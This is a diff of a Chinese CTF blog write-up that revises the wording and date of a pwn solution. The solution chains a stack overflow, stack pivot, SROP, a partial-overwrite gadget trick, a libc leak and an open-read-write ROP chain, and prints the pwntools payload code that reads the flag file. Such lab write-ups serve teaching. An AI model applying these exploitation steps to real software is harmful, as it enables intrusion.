@@ -49,7 +49,7 @@
 <meta property="og:image" content="https://roxy5201314.github.io/images/121.png">
 <meta property="og:image" content="https://roxy5201314.github.io/images/122.png">
 <meta property="article:published_time" content="2026-03-31T10:42:17.000Z">
-<meta property="article:modified_time" content="2026-03-31T16:29:03.112Z">
+<meta property="article:modified_time" content="2026-04-15T16:38:26.906Z">
 <meta property="article:author" content="roxy">
 <meta property="article:tag" content="ORW">
 <meta property="article:tag" content="SROP">
@@ -329,7 +329,7 @@
 <p>一件完美的艺术品，葬下了整个栈时代</p>
 <p>本题风格是极简，不加那些乱七八糟的东西把题目弄的又乱又看不懂，好让做题者知道，做的是pwn题，不是逆向</p>
 <p>要让每个不懂逆向的小pwn手都能看懂题目意思，这才是纯粹的pwn</p>
-<p>来看看题目吧!</p>
+<p>来看看题目吧</p>
 <p>首先是main函数</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">return</span> vuln();<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -352,7 +352,7 @@
 <p>继续看vuln函数</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> rread();<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>套娃是吧，后面你就懂了…</p>
+<p>套娃是吧，后面你就懂了</p>
 <p>接下来是<code>rread</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">rread</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-60h] BYREF</span><br><br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x88u</span>LL);<br>  <span class="hljs-keyword">return</span> shadow((__int64)buf);<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -373,7 +373,7 @@
 <p>我们能干什么呢?</p>
 <p>不妨调试一下</p>
 <div class="note note-info">
-            <p>注意本地调试最好先暂时关闭<code>ASLR</code>(qwq)</p> 
+            <p>注意本地调试最好先暂时关闭<code>ASLR</code></p> 
           </div>
 
 <p><img src="/images/99.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
@@ -399,7 +399,7 @@
 <p>此时便会从我们控制的地址开始执行</p>
 <p>即能控制程序执行流程</p>
 <div class="note note-primary">
-            <p>栈迁移(stack pivot)基础，不再赘述(qwq)</p> 
+            <p>栈迁移(stack pivot)基础，不再赘述</p> 
           </div>
 
 <p>因此我们布置上面的payload，从而控制执行流再次<code>read</code>，创造利用空间</p>
@@ -423,19 +423,19 @@
 <p>发现了什么</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000001845                 lea     rax, [rbp+buf]<br></code></pre></td></tr></table></figure>
 
-<p><code>call read</code>的返回地址直接被保存在栈上!</p>
+<p><code>call read</code>的返回地址直接被保存在栈上</p>
 <p>补充一下</p>
 <p>read其实是glibc共享库中封装好的函数以方便用户的直接调用</p>
 <p>其内部实则是这样的</p>
 <p><img src="/images/104.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
-<p>当执行<code>SYS_read</code>时才真正触发<strong>系统调用</strong>阻塞并等待中断触发时唤醒读入(操作系统学了吗???)</p>
+<p>当执行<code>SYS_read</code>时才真正触发<strong>系统调用</strong>阻塞并等待中断触发时唤醒读入</p>
 <p>更底层看，便是汇编</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax, 0<br>mov rdi, fd<br>mov rsi, buf<br>mov rdx, size<br>syscall<br></code></pre></td></tr></table></figure>
 
 <p>更更底层呢</p>
 <p>那便是硬件在干活了</p>
-<p>我们直接忽略吧(bushi)</p>
-<p>因此，我们完全可以在执行<code>SYS_read</code>读入时覆盖<code>call read</code>这个glibc函数的返回地址与rbp，从而绕过检测，控制执行流!</p>
+<p>我们直接忽略吧</p>
+<p>因此，我们完全可以在执行<code>SYS_read</code>读入时覆盖<code>call read</code>这个glibc函数的返回地址与rbp，从而绕过检测，控制执行流</p>
 <p>那下一步的目标呢?</p>
 <p>由于没有gadget，我们只能打<code>SROP</code>，因此思路便是寻找在栈上的libc地址，通过<code>partial overwrite</code>，覆写为<code>syscall</code></p>
 <p>并通过<code>rax</code>保存函数返回值的机制，通过读入15字节触发<code>SROP</code></p>
@@ -455,7 +455,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x0000000000001252 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret<br></code></pre></td></tr></table></figure>
 
 <p>看似平平无奇</p>
-<p>实则却能发挥出巨大的威力(细品)</p>
+<p>实则却能发挥出巨大的威力</p>
 <p>我们通过<code>SROP</code>设置好精确计算偏移的<code>rbx</code>和<code>rbp</code></p>
 <p>然后利用这个<code>gadget</code></p>
 <p>将<code>syscall</code>覆写为<code>syscall ret</code></p>
@@ -493,7 +493,7 @@
 <p><img src="/images/116.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>再次打栈返回</p>
 <p>此时<code>sigcontext</code>已经布置好，只需要将rax设置为15随后<code>syscall</code></p>
-<p>注意rbp先前巧妙的设置以顺利读入15字节!</p>
+<p>注意rbp先前巧妙的设置以顺利读入15字节</p>
 <p><code>call read</code>返回地址:</p>
 <p><img src="/images/117.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>布置<code>payload5</code></p>
@@ -503,23 +503,23 @@
 <p>此时栈布局:</p>
 <p><img src="/images/118.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>配合先前的栈风水布局与<code>pop rbp ret</code></p>
-<p>读入15字节成功设置rax为15，随后<code>syscall</code>!</p>
+<p>读入15字节成功设置rax为15，随后<code>syscall</code></p>
 <p><img src="/images/119.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>触发<code>sigreturn</code></p>
 <p><img src="/images/120.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>成功控制所有寄存器并再次<code>read</code></p>
 <p>依旧布置<code>sigcontext</code>的同时打<strong>栈返回</strong></p>
-<p>原理一致，我就不贴图了qwq</p>
+<p>原理一致，我就不贴图了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">payload6 = p64(leave_ret)<br>payload6 += p64(magic_gadget)<br>payload6 += p64(pop_rbp_ret)<br>payload6 += p64(RBP + <span class="hljs-number">0xa8</span> + <span class="hljs-number">1</span>) + p64(read1) + p64(RBP + <span class="hljs-number">0x20</span>)<br>payload6 += p64(leave_ret) + p64(RBP + <span class="hljs-number">0xd0</span>) + p64(read1) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>payload6 += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># rdi</span><br>payload6 += p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rsi</span><br>payload6 += p64(RBP + <span class="hljs-number">0x68</span>) <span class="hljs-comment"># rbp</span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rbx</span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rdx</span><br>payload6 += p64(<span class="hljs-number">33</span>) <span class="hljs-comment"># rax </span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rcx</span><br>payload6 += p64(RBP + <span class="hljs-number">0x28</span>) <span class="hljs-comment"># rsp</span><br>payload6 += p64(ret) <span class="hljs-comment"># rip</span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># eflags</span><br>payload6 += p64(<span class="hljs-number">0x33</span>) <span class="hljs-comment"># cs/gs/fs</span><br></code></pre></td></tr></table></figure>
 
 <p>由于<code>rbp</code>和<code>rbx</code>已经被我们所控制</p>
 <p>此时执行<code>magic-gadget</code>后</p>
-<p>成功获得<code>syscall ret</code>!</p>
+<p>成功获得<code>syscall ret</code></p>
 <p><img src="/images/121.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>随后依旧<code>SROP</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload7 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + p64(pop_rbp_ret)<br></code></pre></td></tr></table></figure>
 
-<p>配合<code>payload6</code>的<code>sigcontext</code>成功<code>dup2(1, 2)</code>!</p>
+<p>配合<code>payload6</code>的<code>sigcontext</code>成功<code>dup2(1, 2)</code></p>
 <p>现在获得标准输出(<code>stdout</code>)了便能轻松泄露libc基址了</p>
 <p>同理</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">payload8 = p64(pop_rbp_ret) + p64(RBP + <span class="hljs-number">0xd8</span> + <span class="hljs-number">1</span>) + p64(read1) + p64(RBP + <span class="hljs-number">0x20</span>) + p64(leave_ret)<br>payload8 += p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rdi</span><br>payload8 += p64(RBP + <span class="hljs-number">0x28</span>) <span class="hljs-comment"># rsi</span><br>payload8 += p64(RBP + <span class="hljs-number">0xe8</span>) <span class="hljs-comment"># rbp</span><br>payload8 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rbx</span><br>payload8 += p64(<span class="hljs-number">0x200</span>) <span class="hljs-comment"># rdx</span><br>payload8 += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># rax </span><br>payload8 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rcx</span><br>payload8 += p64(RBP + <span class="hljs-number">0x28</span>) <span class="hljs-comment"># rsp</span><br>payload8 += p64(ret) <span class="hljs-comment"># rip</span><br>payload8 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># eflags</span><br>payload8 += p64(<span class="hljs-number">0x33</span>) <span class="hljs-comment"># cs/gs/fs</span><br>payload8 += p64(read3)<br><br>payload9 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + p64(pop_rbp_ret)<br></code></pre></td></tr></table></figure>
@@ -527,14 +527,14 @@
 <p>接收</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">syscall = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>libc_base = syscall - <span class="hljs-number">0x98fb6</span><br>success(<span class="hljs-string">&#x27;libc_base =&gt;&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>pop_rax_ret = libc_base + <span class="hljs-number">0xdd237</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x10f75b</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x110a4d</span><br></code></pre></td></tr></table></figure>
 
-<p>最后打<code>ORW</code>获得flag!</p>
+<p>最后打<code>ORW</code>获得flag</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload10 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xc0</span> + <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br><span class="hljs-comment"># close</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">3</span>) + p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br><span class="hljs-comment"># open</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_rdi_ret) + p64(RBP + <span class="hljs-number">0xe8</span>) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br><span class="hljs-comment"># read</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_ret) + p64(RBP) + p64(syscall)<br><span class="hljs-comment"># write</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi_ret) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br></code></pre></td></tr></table></figure>
 
-<p>拿下!</p>
+<p>拿下</p>
 <p><img src="/images/122.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <hr>
 <p>总结:</p>
-<p>部分过程原理一致，我便没有详细展开了，求放过</p>
+<p>部分过程原理一致，我便没有详细展开了</p>
 <p>但自己学习时一定要<code>hands-on</code>动手布局，<strong>调试</strong>，方能领悟其真谛</p>
 <p>同时不得不感叹</p>
 <p>这道题真是惊艳啊</p>
@@ -634,7 +634,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年4月1日</div>
+          <div>2026年4月16日</div>
         </div>
       
       
